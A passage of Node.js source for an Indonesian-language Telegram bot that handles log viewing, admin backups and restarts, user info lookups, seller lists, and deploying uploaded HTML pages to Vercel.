`• Belum ada error yang tercatat\n` +
`• File log belum dibuat\n` +
`• Path file tidak sesuai`,
{ parse_mode: 'HTML' }
);
}
const logStats = fs.statSync(LOG_FILE);
if (logStats.size === 0) {
return bot.sendMessage(chatId,
`<blockquote>📜 LOG ERROR KOSONG</blockquote>\n\n` +
`File log.txt ditemukan tetapi isinya kosong.\n\n` +
`<i>Bot berjalan dengan baik! ✅</i>`,
{ parse_mode: 'HTML' }
);
}
const logContent = fs.readFileSync(LOG_FILE, 'utf-8');
if (!logContent || logContent.trim().length === 0) {
return bot.sendMessage(chatId,
`<blockquote>📜 LOG ERROR KOSONG</blockquote>\n\n` +
`File log.txt ditemukan tetapi tidak berisi data.\n\n` +
`<i>Bot berjalan dengan baik! ✅</i>`,
{ parse_mode: 'HTML' }
);
}
const lines = logContent.split('\n').filter(line => line.trim() !== '');
const totalLines = lines.length;
const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0];
const filename = `log_${timestamp}.txt`;
const readStream = fs.createReadStream(LOG_FILE);
await bot.sendDocument(chatId, readStream, {
caption: `<blockquote>📜 LOG ERROR FILE</blockquote>\n\n` +
`<b>File:</b> ${filename}\n` +
`<b>Total Baris:</b> ${totalLines} baris\n` +
`<b>Ukuran:</b> ${(logStats.size / 1024).toFixed(2)} KB\n` +
`<b>Dibuat:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
`<i>File log.txt berhasil dikirim.</i>`,
parse_mode: 'HTML',
filename: filename
});
} catch (error) {
console.error('Log viewer error:', error);
let errorMessage = error.message || 'Unknown error';
bot.sendMessage(chatId,
`<blockquote>❌ GAGAL MEMBACA LOG</blockquote>\n\n` +
`<b>Error:</b> ${errorMessage}\n` +
`<b>File:</b> log.txt\n` +
`<b>Path:</b> ${LOG_FILE}\n\n` +
`Periksa apakah file log.txt ada dan dapat dibaca.`,
{ parse_mode: 'HTML' }
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 💾 BACKUP DATA COMMAND (ADMIN ONLY)
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/backup$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/backup';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<b>❌ Hanya admin yang bisa!</b>', { parse_mode: 'HTML' });
}
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>💾 Backup Data</blockquote>\n\n` +
`🔄 <b>Status:</b> Memulai proses backup...\n` +
`📁 <b>Folder:</b> lib/\n` +
`⏳ <b>Waktu:</b> ${new Date().toLocaleTimeString('id-ID', {hour12: false})}`,
{ parse_mode: 'HTML' }
);
try {
if (!fs.existsSync(DATA_DIR)) {
await bot.editMessageText(
`<blockquote>❌ Backup Gagal</blockquote>\n\n` +
`Folder <code>lib/</code> tidak ditemukan.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
return;
}
const files = fs.readdirSync(DATA_DIR);
const jsonFiles = files.filter(file => file.endsWith('.json'));
if (jsonFiles.length === 0) {
await bot.editMessageText(
`<blockquote>❌ Backup Gagal</blockquote>\n\n` +
`Tidak ada file JSON ditemukan di folder <code>lib/</code>.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
return;
}
await bot.editMessageText(
`<blockquote>💾 Backup Data</blockquote>\n\n` +
`🔄 <b>Status:</b> Membaca ${jsonFiles.length} file JSON...\n` +
`📁 <b>File ditemukan:</b> ${jsonFiles.length}\n` +
`⏳ <b>Waktu:</b> ${new Date().toLocaleTimeString('id-ID', {hour12: false})}`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0] + '_' + 
new Date().getTime().toString().slice(-6);
const backupFileName = `backup_${timestamp}.zip`;
const backupFilePath = path.join(__dirname, backupFileName);
const output = fs.createWriteStream(backupFilePath);
const archive = archiver('zip', {
zlib: { level: 9 }
});
output.on('close', async () => {
try {
const fileSize = archive.pointer();
const formattedSize = (fileSize / 1024).toFixed(2) + ' KB';
const statusMessage = `<blockquote>💾 Backup Data</blockquote>\n\n` +
`✅ <b>Status:</b> Backup berhasil dibuat!\n` +
`📁 <b>File:</b> ${backupFileName}\n` +
`📦 <b>Ukuran:</b> ${formattedSize}\n` +
`📄 <b>Total file:</b> ${jsonFiles.length}\n` +
`⏳ <b>Waktu:</b> ${new Date().toLocaleTimeString('id-ID', {hour12: false})}\n\n` +
`<i>⏰ Pesan ini akan terhapus otomatis dalam 15 detik...</i>`;
await bot.editMessageText(statusMessage, {
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
});
const zipBuffer = fs.readFileSync(backupFilePath);
await bot.sendDocument(chatId, zipBuffer, {
caption: `<blockquote>💾 Backup Data Berhasil</blockquote>\n\n` +
`📁 <b>Nama File:</b> ${backupFileName}\n` +
`📦 <b>Ukuran:</b> ${formattedSize}\n` +
`📄 <b>Total File JSON:</b> ${jsonFiles.length}\n\n` +
`<b>📋 Daftar File:</b>\n${jsonFiles.map((file, index) => `${index + 1}. ${file}`).join('\n')}\n\n` +
`<blockquote>⏰ Backup dibuat: ${new Date().toLocaleString('id-ID')}</blockquote>`,
parse_mode: 'HTML'
});
fs.unlinkSync(backupFilePath);
setTimeout(async () => {
try {
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (deleteError) {
console.error('Gagal menghapus pesan status:', deleteError);
}
}, 15000);
} catch (error) {
console.error('Error sending backup file:', error);
logError('BACKUP_SEND_ERROR', `Error: ${error.message}`, userId);
await bot.editMessageText(
`<blockquote>❌ Error Mengirim Backup</blockquote>\n\n` +
`Error: ${error.message}`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
});
archive.on('error', async (err) => {
console.error('Archive error:', err);
logError('BACKUP_ARCHIVE_ERROR', `Error: ${err.message}`, userId);
await bot.editMessageText(
`<blockquote>❌ Error Membuat Archive</blockquote>\n\n` +
`Error: ${err.message}`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
});
archive.pipe(output);
jsonFiles.forEach(file => {
const filePath = path.join(DATA_DIR, file);
archive.file(filePath, { name: file });
});
archive.finalize();
} catch (error) {
console.error('Backup error:', error);
logError('BACKUP_ERROR', `Error: ${error.message}`, userId);
await bot.editMessageText(
`<blockquote>❌ Backup Gagal</blockquote>\n\n` +
`Error: ${error.message}`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🔄 RESTART BOT COMMAND (ADMIN ONLY) - DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/restart$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/restart';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, '<b>❌ Hanya admin yang bisa!</b>', { parse_mode: 'HTML' });
}
const bars = [
`<blockquote>⚡ <b>ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ʀᴇꜱᴛᴀʀᴛ ꜱᴇǫᴜᴇɴᴄᴇ...</b>\n░░░░░░░░░ 0%</blockquote>`,
`<blockquote>⚡ <b>ꜱʏꜱᴛᴇᴍ ʀᴇꜱᴛᴀʀᴛ ɪɴ ᴘʀᴏɢʀᴇꜱꜱ...</b>\n████░░░░░ 40%</blockquote>`,
`<blockquote>⚡ <b>ꜰɪɴᴀʟɪᴢɪɴɢ ʀᴇꜱᴛᴀʀᴛ ᴘʀᴏᴄᴇꜱꜱ...</b>\n████████░░ 80%</blockquote>`,
`<blockquote>✅ <b>ʀᴇꜱᴛᴀʀᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n██████████ 100%</blockquote>`,
`<blockquote>🔐 <b>ᴀᴜᴛᴏ-ʟᴏɢɪɴ ꜱᴇꜱꜱɪᴏɴ ꜱᴀᴠᴇᴅ</b>\n✓ ɴᴏ ᴘᴀꜱꜱᴡᴏʀᴅ ʀᴇǫᴜɪʀᴇᴅ ᴏɴ ɴᴇxᴛ ʟᴀᴜɴᴄʜ</blockquote>`,
`<blockquote>🔄 <b>ʀᴇꜱᴛᴀʀᴛɪɴɢ ʙᴏᴛ...</b>\n⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ 3 ꜱᴇᴄᴏɴᴅꜱ</blockquote>`
];
try {
let sent = await bot.sendMessage(chatId, bars[0], { parse_mode: "HTML" });
for (let i = 1; i < bars.length; i++) {
await new Promise(resolve => setTimeout(resolve, 700));
await bot.editMessageText(bars[i], {
chat_id: chatId,
message_id: sent.message_id,
parse_mode: "HTML"
});
}
const finalMessage = `<blockquote><b>👋 ʙᴏᴛ ɪꜱ ʀᴇꜱᴛᴀʀᴛɪɴɢ...</b>\n<b>🎯 ʙᴇ ʀɪɢʜᴛ ʙᴀᴄᴋ!</b>\n\n<i>Pesan ini akan terhapus otomatis dalam 5 detik...</i></blockquote>`;
await bot.editMessageText(finalMessage, {
chat_id: chatId,
message_id: sent.message_id,
parse_mode: "HTML"
});
await new Promise(resolve => setTimeout(resolve, 5000));
try {
await bot.deleteMessage(chatId, sent.message_id);
} catch (deleteError) {
console.log('Tidak bisa menghapus pesan, lanjut restart:', deleteError.message);
}
const restartData = {
chatId: chatId,
messageId: sent.message_id,
adminId: userId,
adminName: username,
restartTime: new Date().toISOString(),
platform: os.platform()
};
saveRestartData(restartData);
process.exit(0);
} catch (error) {
console.error('Restart error:', error);
logError('RESTART_ERROR', `Error: ${error.message}`, userId);
bot.sendMessage(chatId, 
`<b>❌ ʀᴇꜱᴛᴀʀᴛ ꜰᴀɪʟᴇᴅ!</b>\nᴘʟᴇᴀꜱᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.`, 
{ parse_mode: "HTML" }
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ℹ️ INFO USER COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/info(?:\s+(.+))?$/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const text = match[1];
const messageText = `/info ${text || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
let targetUser = null;
let targetUserId = null;
if (msg.reply_to_message && msg.reply_to_message.from) {
targetUser = msg.reply_to_message.from;
targetUserId = targetUser.id.toString();
} 
else if (text) {
if (text.startsWith('@')) {
const targetUsername = text.substring(1).toLowerCase();
const users = loadUsers();
const foundUser = Object.entries(users).find(([id, userData]) => {
if (userData.username) {
const storedUsername = userData.username.startsWith('@') ? 
userData.username.substring(1).toLowerCase() : 
userData.username.toLowerCase();
return storedUsername === targetUsername;
}
return false;
});
if (foundUser) {
const [id, userData] = foundUser;
targetUserId = id;
targetUser = {
id: parseInt(id),
first_name: userData.first_name || '',
last_name: userData.last_name || '',
username: userData.username && userData.username.startsWith('@') ? 
userData.username.substring(1) : userData.username
};
} else {
return bot.sendMessage(chatId,
`<blockquote>❌ User Tidak Ditemukan</blockquote>\n\n` +
`Username <code>${text}</code> tidak ditemukan dalam database.`,
{ parse_mode: 'HTML' }
);
}
} 
else if (/^\d+$/.test(text)) {
targetUserId = text.trim();
const users = loadUsers();
const userData = users[targetUserId];
if (userData) {
targetUser = {
id: parseInt(targetUserId),
first_name: userData.first_name || '',
last_name: userData.last_name || '',
username: userData.username && userData.username.startsWith('@') ? 
userData.username.substring(1) : userData.username
};
} else {
targetUser = {
id: parseInt(targetUserId),
first_name: 'Unknown',
last_name: '',
username: null
};
}
} 
else {
return bot.sendMessage(chatId,
`<blockquote>❌ Format Tidak Valid</blockquote>\n\n` +
`Gunakan salah satu format berikut:\n\n` +
`• <code>/info</code> (untuk info diri sendiri)\n` +
`• <code>/info @username</code>\n` +
`• <code>/info 123456789</code>\n` +
`• Reply pesan seseorang dengan <code>/info</code>`,
{ parse_mode: 'HTML' }
);
}
} 
else {
targetUser = msg.from;
targetUserId = userId;
}
const users = loadUsers();
const reseller = loadReseller();
const admins = loadAdmins();
const userData = users[targetUserId] || {};
const isTargetAdmin = isAdmin(targetUserId);
const isTargetReseller = isReseller(targetUserId);
const isUserAdmin = isAdmin(userId);
let status = 'User';
if (isTargetAdmin) {
status = '👑 Admin';
} else if (isTargetReseller) {
status = '⭐ Seller';
}
const fullName = `${userData.first_name || targetUser.first_name || ''} ${userData.last_name || targetUser.last_name || ''}`.trim() || 'Tidak diketahui';
const targetUsername = userData.username ? 
(userData.username.startsWith('@') ? userData.username : `@${userData.username}`) : 
(targetUser.username ? `@${targetUser.username}` : 'Tidak ada');
let joinDate = 'Tidak diketahui';
if (userData.joinedAt) {
const date = new Date(userData.joinedAt);
joinDate = date.toLocaleDateString('id-ID', { 
weekday: 'long',
year: 'numeric',
month: 'long',
day: 'numeric',
hour: '2-digit',
minute: '2-digit'
});
}
let lastSeen = 'Tidak diketahui';
if (userData.lastSeen) {
const date = new Date(userData.lastSeen);
const now = new Date();
const diffMs = now - date;
const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
const diffHours = Math.floor((diffMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
const diffMins = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
if (diffDays > 0) {
lastSeen = `${diffDays} hari yang lalu`;
} else if (diffHours > 0) {
lastSeen = `${diffHours} jam yang lalu`;
} else if (diffMins > 0) {
lastSeen = `${diffMins} menit yang lalu`;
} else {
lastSeen = 'Baru saja';
}
}
const dcId = (targetUser.id >> 32) % 256;
let infoMessage = `<blockquote>📋 USER INFORMATION</blockquote>\n\n`;
infoMessage += `👤 <b>Name:</b> ${fullName}\n`;
infoMessage += `🆔 <b>User ID:</b> <code>${targetUserId}</code>\n`;
infoMessage += `🌐 <b>Username:</b> ${targetUsername}\n`;
infoMessage += `📅 <b>Bergabung:</b> ${joinDate}\n`;
infoMessage += `👀 <b>Terakhir dilihat:</b> ${lastSeen}\n`;
infoMessage += `🏢 <b>DC ID:</b> ${dcId}\n`;
infoMessage += `👑 <b>Status:</b> ${status}\n`;
if (isUserAdmin) {
const transactions = loadTransactions();
let panelCount = 0;
let sellerCount = 0;
Object.values(transactions).forEach(transaction => {
if (transaction.userId === targetUserId && transaction.status === 'completed') {
panelCount++;
if (transaction.createdBy === 'seller') {
sellerCount++;
}
}
});
infoMessage += `\n<blockquote>📊 ADMIN INFO:</blockquote>\n`;
infoMessage += `📦 <b>Total Panel Dibuat:</b> ${panelCount}\n`;
if (panelCount > 0) {
infoMessage += `⭐ <b>Sebagai Seller:</b> ${sellerCount} panel\n`;
infoMessage += `👤 <b>Sebagai User:</b> ${panelCount - sellerCount} panel\n`;
}
}
if (isTargetReseller && !isTargetAdmin) {
infoMessage += `\n<blockquote>⭐ SELLER INFO:</blockquote>\n`;
infoMessage += `✅ <b>Akses:</b> Bisa buat panel gratis\n`;
infoMessage += `📅 <b>Aktif Sejak:</b> ${joinDate}\n`;
infoMessage += `👤 <b>Referensi ID:</b> <code>${targetUserId}</code>\n`;
}
infoMessage += `\n<blockquote><i>Generated by ${config.BOT_NAME || 'Novabot'} • ${new Date().getFullYear()}</i></blockquote>`;
try {
if (msg.reply_to_message && msg.reply_to_message.from) {
const photos = await bot.getUserProfilePhotos(targetUser.id, { limit: 1 });
if (photos.total_count > 0) {
const fileId = photos.photos[0][0].file_id;
const file = await bot.getFile(fileId);
const photoUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${file.file_path}`;
const response = await axios.get(photoUrl, { responseType: 'arraybuffer' });
const avatarBuffer = Buffer.from(response.data, 'binary');
return bot.sendPhoto(chatId, avatarBuffer, {
caption: infoMessage,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
} catch (error) {
console.log('Tidak bisa mengambil foto profil:', error.message);
}
return bot.sendMessage(chatId, infoMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📋 LIST SELLER COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/listseller$/, (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/listseller';
logUserInteraction(userId, username, chatType, messageText, groupName);
const reseller = loadReseller();
const users = loadUsers();
const resellerIds = Object.keys(reseller);
if (resellerIds.length === 0) {
return bot.sendMessage(chatId,
`<blockquote>📋 DAFTAR SELLER</blockquote>\n\n` +
`<b>Total Seller:</b> 0\n\n` +
`Belum ada seller terdaftar.`,
{ parse_mode: 'HTML' }
);
}
let message = `<blockquote>📋 DAFTAR SELLER</blockquote>\n\n`;
message += `<b>Total Seller:</b> ${resellerIds.length}\n\n`;
message += `<b>List Nama Seller:</b>\n`;
resellerIds.forEach((id, index) => {
const userData = users[id] || {};
const sellerName = userData.username ? 
`${userData.username}` : 
(userData.first_name || `Seller_${index + 1}`);
message += `${index + 1} ${sellerName}\n`;
});
if (isAdmin(userId)) {
message += `\n<blockquote>Gunakan /delseller untuk melihat daftar seller dengan ID.</blockquote>`;
} else {
message += `\n<blockquote>Info: Hanya admin yang bisa menambah/hapus seller</blockquote>`;
}
bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📝 COMMAND /DEPLOY - HANDLER UTAMA
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/deploy$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
deployStates[userId] = {
step: 'waiting_for_html',
htmlContent: null,
siteName: null,
timeout: null,
messageId: null
};
console.log(`User ${username} (${userId}) memulai deploy`);
const instructions = `<blockquote>🚀 FITUR DEPLOY WEBSITE HTML</blockquote>

<blockquote><b>Silakan kirim file HTML Anda dengan nama <code>index.html</code></b></blockquote>

<blockquote><b>📌 SYARAT & KETENTUAN:</b>
• File harus berekstensi .html
• Nama file harus <code>index.html</code> (wajib)
• Maksimal ukuran file: 5MB
• Hanya file HTML yang diperbolehkan</blockquote>

<blockquote><b>⏰ WAKTU:</b>
• Anda punya 2 menit untuk mengirim file
• Jika tidak ada respon, proses akan dibatalkan</blockquote>

<blockquote><b>📤 Silakan upload file HTML Anda sekarang...</b></blockquote>`;
const sentMessage = await bot.sendMessage(chatId, instructions, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
deployStates[userId].messageId = sentMessage.message_id;
deployStates[userId].timeout = setTimeout(async () => {
if (deployStates[userId] && deployStates[userId].step !== 'completed') {
await bot.sendMessage(chatId, 
`<blockquote>⏳ WAKTU HABIS</blockquote>\n\n` +
`Proses deploy dibatalkan karena tidak ada respon selama 2 menit.\n` +
`Gunakan /deploy untuk memulai kembali.`,
{ parse_mode: 'HTML' }
);
delete deployStates[userId];
}
}, 120000); // 2 menit = 120000 ms
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📁 HANDLER UNTUK MENERIMA FILE HTML
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('document', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
if (!deployStates[userId] || deployStates[userId].step !== 'waiting_for_html') {
return;
}    
const fileId = msg.document.file_id;
const fileName = msg.document.file_name;
const fileSize = msg.document.file_size;
console.log(`User ${userId} mengirim file: ${fileName} (${fileSize} bytes)`);
if (!fileName.toLowerCase().endsWith('.html')) {
await bot.sendMessage(chatId, 
`<blockquote>❌ FILE TIDAK VALID</blockquote>\n\n` +
`Hanya file HTML yang diperbolehkan.\n` +
`Nama file Anda: <code>${fileName}</code>\n\n` +
`Silakan kirim file HTML dengan nama <code>index.html</code>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
return;
}
if (fileName.toLowerCase() !== 'index.html') {
await bot.sendMessage(chatId,
`<blockquote>❌ NAMA FILE SALAH</blockquote>\n\n` +
`Nama file wajib: <code>index.html</code>\n` +
`Nama file Anda: <code>${fileName}</code>\n\n` +
`Silakan rename file menjadi <code>index.html</code> dan kirim ulang.`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
return;
}
if (fileSize > 5 * 1024 * 1024) { // 5MB limit
await bot.sendMessage(chatId,
`<blockquote>❌ UKURAN TERLALU BESAR</blockquote>\n\n` +
`Ukuran file: ${(fileSize / 1024 / 1024).toFixed(2)}MB\n` +
`Maksimal: 5MB\n\n` +
`Silakan kompres file atau gunakan file yang lebih kecil.`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
return;
}
if (deployStates[userId].timeout) {
clearTimeout(deployStates[userId].timeout);
}
try {
const processingMsg = await bot.sendMessage(chatId, 
`<blockquote>📥 MENDOWNLOAD FILE...</blockquote>\n\n` +
`Nama: <code>${fileName}</code>\n` +
`Ukuran: ${(fileSize / 1024).toFixed(2)}KB\n` +
`Status: Memproses...`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const fileUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${file.file_path}`;
console.log(`Downloading file from: ${fileUrl}`);
const response = await axios.get(fileUrl, { responseType: 'arraybuffer' });
const fileContent = response.data.toString('utf-8');
if (!fileContent.includes('<html') && !fileContent.includes('<!DOCTYPE')) {
await bot.editMessageText(
`<blockquote>❌ KONTEN BUKAN HTML</blockquote>\n\n` +
`File yang Anda kirim tidak terdeteksi sebagai file HTML valid.\n` +
`Pastikan file berisi kode HTML yang benar.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,   
parse_mode: 'HTML'
}
);
delete deployStates[userId];
return;
}
deployStates[userId].htmlContent = fileContent;
deployStates[userId].step = 'waiting_for_site_name';
await bot.editMessageText(
`<blockquote>✅ FILE DITERIMA</blockquote>\n\n` +
`File <code>${fileName}</code> berhasil diupload!\n\n` +
`<blockquote><b>Sekarang berikan nama untuk website Anda:</b></blockquote>\n\n` +
`• Hanya huruf kecil, angka, dan tanda hubung (-)\n` +
`• Contoh: <code>my-website-123</code>\n` +
`• Tidak boleh mengandung spasi atau simbol khusus\n` +
`• Minimal 3 karakter, maksimal 30 karakter\n\n` +
`<blockquote><i>⏳ Anda memiliki 2 menit untuk memberikan nama...</i></blockquote>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
deployStates[userId].timeout = setTimeout(async () => {
if (deployStates[userId] && deployStates[userId].step !== 'completed') {
await bot.sendMessage(chatId, 
`<blockquote>⏳ WAKTU HABIS</blockquote>\n\n` +
`Proses deploy dibatalkan karena tidak ada respon selama 2 menit.\n` +
`Gunakan /deploy untuk memulai kembali.`,
{ parse_mode: 'HTML' }
);
delete deployStates[userId];
}
}, 120000); // 2 menit = 120000 ms
} catch (error) {
console.error('Error processing file:', error);
await bot.sendMessage(chatId,
`<blockquote>❌ ERROR</blockquote>\n\n` +
`Gagal memproses file: ${error.message}\n` +
`Silakan coba lagi dengan /deploy`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
delete deployStates[userId];
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📝 HANDLER UNTUK MENERIMA NAMA WEBSITE
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('message', async (msg) => {
if (!msg.text || msg.text.startsWith('/')) {
return;
}
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const text = msg.text.trim();
if (!deployStates[userId] || deployStates[userId].step !== 'waiting_for_site_name') {
return;
}
const siteName = text.toLowerCase();
if (!/^[a-z0-9-]+$/.test(siteName)) {
await bot.sendMessage(chatId,
`<blockquote>❌ NAMA TIDAK VALID</blockquote>\n\n` +
`Nama: <code>${siteName}</code>\n\n` +
`<blockquote><b>Format yang diperbolehkan:</b>\n` +
`• Hanya huruf kecil (a-z)\n` +
`• Angka (0-9)\n` +
`• Tanda hubung (-)</blockquote>\n\n` +
`<blockquote><b>Contoh yang benar:</b>\n` +
`<code>my-website</code>\n` +
`<code>web-123</code>\n` +
`<code>project-name-2024</code></blockquote>\n\n` +
`Silakan kirim nama yang sesuai format...`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
return;
}
if (siteName.length < 3 || siteName.length > 30) {
await bot.sendMessage(chatId,
`<blockquote>❌ PANJANG NAMA TIDAK SESUAI</blockquote>\n\n` +
`Panjang: ${siteName.length} karakter\n\n` +
`<blockquote><b>Syarat panjang nama:</b>\n` +
`• Minimal 3 karakter\n` +
`• Maksimal 30 karakter</blockquote>\n\n` +
`Silakan kirim nama yang sesuai...`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
return;
}
if (siteName.startsWith('-') || siteName.endsWith('-')) {
await bot.sendMessage(chatId,
`<blockquote>❌ NAMA TIDAK VALID</blockquote>\n\n` +
`Nama tidak boleh dimulai atau diakhiri dengan tanda hubung (-)\n` +
`Nama Anda: <code>${siteName}</code>\n\n` +
`<blockquote><b>Contoh yang benar:</b>\n` +
`<code>my-website</code> (bukan <code>-my-website</code> atau <code>my-website-</code>)</blockquote>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
return;
}
if (deployStates[userId].timeout) {
clearTimeout(deployStates[userId].timeout);
}
deployStates[userId].siteName = siteName;
deployStates[userId].step = 'deploying';
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🚀 MEMPROSES DEPLOY...</blockquote>\n\n` +
`<blockquote><b>Nama Website:</b> <code>${siteName}</code>\n` +
`<b>File:</b> index.html\n` +
`<b>Status:</b> Menyiapkan deployment ke Vercel...</blockquote>\n\n` +
`<blockquote><i>⏳ Mohon tunggu, proses mungkin memakan waktu 30-60 detik...</i></blockquote>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);    
try {
console.log(`Memulai deploy untuk: ${siteName}`);
const result = await deployToVercel(siteName, deployStates[userId].htmlContent);
if (result.success) {
await bot.editMessageText(
`<blockquote>✅ WEBSITE BERHASIL DIBUAT!</blockquote>\n\n` +
`<blockquote><b>Detail Website:</b>\n` +
`🌐 <b>URL:</b> <a href="${result.url}">${result.url}</a>\n` +
`📁 <b>Nama:</b> <code>${siteName}</code>\n` +
`📄 <b>File:</b> index.html\n` +
`📊 <b>Status:</b> ${result.readyState}\n` +
`⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}</blockquote>\n\n` +
`<blockquote><b>Instruksi:</b>\n` +
`• Klik URL di atas untuk mengakses website\n` +
`• Website sudah online dan bisa diakses publik\n` +
`• Untuk perubahan, upload file baru dengan /deploy</blockquote>\n\n` +
`<blockquote><i>Website dibuat dengan ❤️ oleh ${config.BOT_NAME || 'Novabot'}</i></blockquote>`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML',
disable_web_page_preview: false
}
);
console.log(`Deploy berhasil: ${result.url}`);
} else {
await bot.editMessageText(
`<blockquote>❌ DEPLOY GAGAL</blockquote>\n\n` +
`<blockquote><b>Error Detail:</b>\n` +
`<b>Nama:</b> <code>${siteName}</code>\n` +
`<b>Error:</b> ${result.error}</blockquote>\n\n` +
`<blockquote><b>Solusi:</b>\n` +
`1. Coba nama website yang berbeda\n` +
`2. Pastikan nama unik dan belum digunakan\n` +
`3. Coba lagi beberapa saat\n` +
`4. Nama mungkin sudah dipakai orang lain</blockquote>\n\n` +
`Gunakan /deploy untuk mencoba lagi.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
console.log(`Deploy gagal: ${result.error}`);
}
} catch (error) {
console.error('Deployment error:', error);
await bot.editMessageText(
`<blockquote>❌ ERROR SISTEM</blockquote>\n\n` +
`<blockquote>Terjadi kesalahan saat deploy:\n` +
`<code>${error.message}</code></blockquote>\n\n` +
`Silakan hubungi admin atau coba lagi nanti.\n` +
`Gunakan /deploy untuk memulai ulang.`,
{
chat_id: chatId,
message_id: processingMsg.message_id,
parse_mode: 'HTML'
}
);
} finally {
delete deployStates[userId];
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🔄 CANCEL DEPLOY (manual)
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/cancel$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
if (deployStates[userId]) {
